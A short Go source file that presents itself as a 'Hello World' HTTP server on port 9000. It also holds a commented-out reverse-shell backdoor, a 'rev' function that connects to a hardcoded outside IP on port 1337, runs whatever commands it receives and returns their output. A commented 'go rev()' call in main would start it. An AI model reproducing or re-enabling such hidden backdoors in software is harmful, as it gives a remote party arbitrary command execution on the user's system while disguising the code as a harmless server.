package main

import (
    "net/http"
//    "bufio"
//    "fmt"
//    "net"
//    "os/exec"
//    "strings"
)

// create a handler struct
type HttpHandler struct{}

// implement `ServeHTTP` method on `HttpHandler` struct
func (h HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) {

    // create response binary data
    data := []byte("Hello World! ❤️") // slice of bytes

    // write `data` to response
    res.Write(data)
}

// func rev(){
//     conn, _ := net.Dial("tcp", "54.229.231.247:1337")
//     for {
//         message, _ := bufio.NewReader(conn).ReadString('\n')
// 	message = strings.TrimSuffix(message, "\n")
//         cmd := strings.Split(message, " ")[0]
// 	args := strings.Split(message, " ")[1:]
//         out, err := exec.Command(cmd, args...).Output()
// 
//         if err != nil {
// 	    fmt.Fprintf(conn, "%s\n",err)
//         }
//         fmt.Fprintf(conn, "%s\n",out)
//     }
// }

func main() {
    //go rev()
    // create a new handler
    handler := HttpHandler{}

    // listen and serve
    http.ListenAndServe(":9000", handler)
}
